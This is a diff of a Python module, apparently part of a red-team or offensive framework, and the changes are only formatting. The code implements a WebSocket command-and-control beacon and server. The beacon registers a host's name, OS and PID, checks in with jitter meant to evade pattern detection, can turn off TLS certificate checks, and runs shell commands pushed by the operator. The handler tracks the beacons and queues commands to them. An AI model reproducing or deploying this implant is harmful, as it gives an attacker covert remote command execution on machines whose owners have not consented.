@@ -17,25 +17,28 @@ from typing import Any
 
 try:
     import websocket
+
     HAS_WEBSOCKET_CLIENT = True
 except ImportError:
     HAS_WEBSOCKET_CLIENT = False
 
 try:
     import websockets
+
     HAS_WEBSOCKET_SERVER = True
 except ImportError:
     HAS_WEBSOCKET_SERVER = False
 
 try:
     from cryptography.fernet import Fernet
+
     HAS_FERNET = True
 except ImportError:
     HAS_FERNET = False
 
 WS_PORT = 9443
-WS_HOST = '0.0.0.0'
-WS_PATH = '/ws/beacon'
+WS_HOST = "0.0.0.0"
+WS_PATH = "/ws/beacon"
 WS_PING_INTERVAL = 30
 WS_SLEEP_JITTER = 5
 
@@ -69,8 +72,8 @@ class WebSocketBeacon:
         if not HAS_WEBSOCKET_CLIENT:
             raise ImportError("websocket-client is required. Install with: pip install websocket-client")
 
-        self.server_url = server_url.rstrip('/')
-        self.beacon_id = beacon_id or str(uuid.uuid4()).replace('-', '')[:16]
+        self.server_url = server_url.rstrip("/")
+        self.beacon_id = beacon_id or str(uuid.uuid4()).replace("-", "")[:16]
         self.sleep_seconds = sleep_seconds
         self.jitter_percent = jitter_percent
         self.ssl_verify = ssl_verify
@@ -100,10 +103,10 @@ class WebSocketBeacon:
     def _build_message(self, msg_type: str, payload: Any = None) -> str:
         """Build a JSON message with encryption."""
         message = {
-            'type': msg_type,
-            'beacon_id': self.beacon_id,
-            'timestamp': int(time.time()),
-            'payload': payload or {},
+            "type": msg_type,
+            "beacon_id": self.beacon_id,
+            "timestamp": int(time.time()),
+            "payload": payload or {},
         }
         raw = json.dumps(message)
         return self._encrypt(raw)
@@ -111,6 +114,7 @@ class WebSocketBeacon:
     def _jittered_sleep(self) -> None:
         """Sleep with jitter to avoid predictable check-in patterns."""
         import random
+
         jitter = self.sleep_seconds * self.jitter_percent * random.uniform(-1, 1)
         sleep_time = max(1, self.sleep_seconds + jitter)
         time.sleep(sleep_time)
@@ -123,22 +127,27 @@ class WebSocketBeacon:
         """
         try:
             ws_kwargs: dict[str, Any] = {
-                'enable_multithread': True,
+                "enable_multithread": True,
             }
 
-            if self.server_url.startswith('wss://') and not self.ssl_verify:
-                ws_kwargs['sslopt'] = {'cert_reqs': ssl.CERT_NONE}
+            if self.server_url.startswith("wss://") and not self.ssl_verify:
+                ws_kwargs["sslopt"] = {"cert_reqs": ssl.CERT_NONE}
 
             if self.proxy:
-                ws_kwargs['http_proxy_host'] = self.proxy
+                ws_kwargs["http_proxy_host"] = self.proxy
 
             self._ws = websocket.create_connection(self.server_url, **ws_kwargs)
 
-            register_msg = self._build_message('register', {
-                'hostname': os.uname().nodename if hasattr(os, 'uname') else os.environ.get('COMPUTERNAME', 'unknown'),
-                'os': os.name,
-                'pid': os.getpid(),
-            })
+            register_msg = self._build_message(
+                "register",
+                {
+                    "hostname": os.uname().nodename
+                    if hasattr(os, "uname")
+                    else os.environ.get("COMPUTERNAME", "unknown"),
+                    "os": os.name,
+                    "pid": os.getpid(),
+                },
+            )
             self._ws.send(register_msg)
             return True
 
@@ -155,19 +164,24 @@ class WebSocketBeacon:
             return None
 
         try:
-            self._ws.send(self._build_message('heartbeat', {
-                'task_count': len(self._tasks),
-                'result_count': len(self._results),
-            }))
+            self._ws.send(
+                self._build_message(
+                    "heartbeat",
+                    {
+                        "task_count": len(self._tasks),
+                        "result_count": len(self._results),
+                    },
+                )
+            )
 
             self._ws.settimeout(5)
             response = self._ws.recv()
 
-            if response == 'pong':
+            if response == "pong":
                 return None
 
             data = json.loads(self._decrypt(response))
-            return data.get('payload', {})
+            return data.get("payload", {})
 
         except websocket.WebSocketTimeoutException:
             return None
@@ -184,11 +198,16 @@ class WebSocketBeacon:
         """
         if self._ws and self._ws.connected:
             try:
-                self._ws.send(self._build_message('result', {
-                    'task_id': task_id,
-                    'output': output[:8192],
-                    'exit_code': exit_code,
-                }))
+                self._ws.send(
+                    self._build_message(
+                        "result",
+                        {
+                            "task_id": task_id,
+                            "output": output[:8192],
+                            "exit_code": exit_code,
+                        },
+                    )
+                )
             except Exception:
                 pass
 
@@ -211,16 +230,18 @@ class WebSocketBeacon:
 
                 task = self.check_in()
 
-                if task and 'command' in task:
-                    cmd = task['command']
-                    task_id = task.get('task_id', 'unknown')
+                if task and "command" in task:
+                    cmd = task["command"]
+                    task_id = task.get("task_id", "unknown")
 
                     if command_handler:
                         output, exit_code = command_handler(cmd)
                     else:
                         try:
                             import shlex
+
                             from core.hardening import safe_subprocess_run
+
                             result = safe_subprocess_run(shlex.split(cmd))
                             output = result.stdout
                             exit_code = result.returncode
@@ -302,47 +323,55 @@ class WebSocketC2Handler:
                 except json.JSONDecodeError:
                     continue
 
-                msg_type = data.get('type', '')
-                beacon_id = data.get('beacon_id', 'unknown')
-                payload = data.get('payload', {})
+                msg_type = data.get("type", "")
+                beacon_id = data.get("beacon_id", "unknown")
+                payload = data.get("payload", {})
 
-                if msg_type == 'register':
+                if msg_type == "register":
                     self.beacons[beacon_id] = {
-                        'websocket': websocket,
-                        'hostname': payload.get('hostname', 'unknown'),
-                        'os': payload.get('os', 'unknown'),
-                        'pid': payload.get('pid', 0),
-                        'last_seen': time.time(),
+                        "websocket": websocket,
+                        "hostname": payload.get("hostname", "unknown"),
+                        "os": payload.get("os", "unknown"),
+                        "pid": payload.get("pid", 0),
+                        "last_seen": time.time(),
                     }
                     if self.beacon_callback:
                         self.beacon_callback(beacon_id, payload)
 
-                elif msg_type == 'heartbeat':
+                elif msg_type == "heartbeat":
                     if beacon_id in self.beacons:
-                        self.beacons[beacon_id]['last_seen'] = time.time()
+                        self.beacons[beacon_id]["last_seen"] = time.time()
 
                     if self.task_callback:
                         tasks = self.task_callback(beacon_id)
                         if tasks:
-                            await websocket.send(json.dumps({
-                                'type': 'task',
-                                'payload': tasks,
-                            }))
+                            await websocket.send(
+                                json.dumps(
+                                    {
+                                        "type": "task",
+                                        "payload": tasks,
+                                    }
+                                )
+                            )
                         else:
-                            await websocket.send('pong')
+                            await websocket.send("pong")
 
-                elif msg_type == 'result':
+                elif msg_type == "result":
                     if self.result_callback:
                         self.result_callback(beacon_id, payload)
 
-                elif msg_type == 'task':
+                elif msg_type == "task":
                     if self.task_callback:
                         tasks = self.task_callback(beacon_id)
                         if tasks:
-                            await websocket.send(json.dumps({
-                                'type': 'task',
-                                'payload': tasks,
-                            }))
+                            await websocket.send(
+                                json.dumps(
+                                    {
+                                        "type": "task",
+                                        "payload": tasks,
+                                    }
+                                )
+                            )
 
         except Exception:
             pass
@@ -399,15 +428,17 @@ class WebSocketC2Handler:
             return False
 
         try:
-            ws = beacon['websocket']
+            ws = beacon["websocket"]
             loop = asyncio.get_event_loop()
-            task_msg = json.dumps({
-                'type': 'task',
-                'payload': {
-                    'command': command,
-                    'task_id': str(uuid.uuid4()),
-                },
-            })
+            task_msg = json.dumps(
+                {
+                    "type": "task",
+                    "payload": {
+                        "command": command,
+                        "task_id": str(uuid.uuid4()),
+                    },
+                }
+            )
             loop.call_soon_threadsafe(lambda: asyncio.ensure_future(ws.send(task_msg)))
             return True
         except Exception:
@@ -421,11 +452,11 @@ class WebSocketC2Handler:
         """
         return [
             {
-                'beacon_id': bid,
-                'hostname': info.get('hostname', 'unknown'),
-                'os': info.get('os', 'unknown'),
-                'pid': info.get('pid', 0),
-                'last_seen': info.get('last_seen', 0),
+                "beacon_id": bid,
+                "hostname": info.get("hostname", "unknown"),
+                "os": info.get("os", "unknown"),
+                "pid": info.get("pid", 0),
+                "last_seen": info.get("last_seen", 0),
             }
             for bid, info in self.beacons.items()
         ]
@@ -440,10 +471,7 @@ class WebSocketC2Handler:
             List of removed beacon IDs.
         """
         now = time.time()
-        stale = [
-            bid for bid, info in self.beacons.items()
-            if now - info.get('last_seen', 0) > timeout
-        ]
+        stale = [bid for bid, info in self.beacons.items() if now - info.get("last_seen", 0) > timeout]
 
         for bid in stale:
             del self.beacons[bid]
